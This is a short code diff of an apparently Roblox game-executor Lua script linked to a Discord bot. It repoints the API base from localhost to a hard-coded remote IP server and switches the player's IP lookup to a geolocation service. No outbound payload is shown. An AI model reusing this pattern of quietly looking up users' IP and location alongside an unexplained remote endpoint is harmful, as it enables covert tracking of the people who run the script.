@@ -22,7 +22,7 @@ local player = Players.LocalPlayer
 -- Enhanced Configuration - Synced with Discord Bot API and localhost endpoints
 local CONFIG = {
     -- Primary API (localhost deployment)
-    API_BASE = "http://localhost:80",
+    API_BASE = "http://185.128.227.86:6081/api/proses",
     
     -- Fallback URLs (including other localhost ports for development)
     FALLBACK_URLS = {
@@ -253,7 +253,7 @@ function DiscordKatabumpExecutor:getIP()
         local requestFunc = (http_request or request or (syn and syn.request))
         if requestFunc then
             local res = requestFunc({
-                Url = "https://api.ipify.org?format=json",
+                Url = "https://ipapi.co/json/",
                 Method = "GET",
                 Headers = { ["User-Agent"] = CONFIG.USER_AGENT },
                 Timeout = 5000 -- Short timeout for IP check
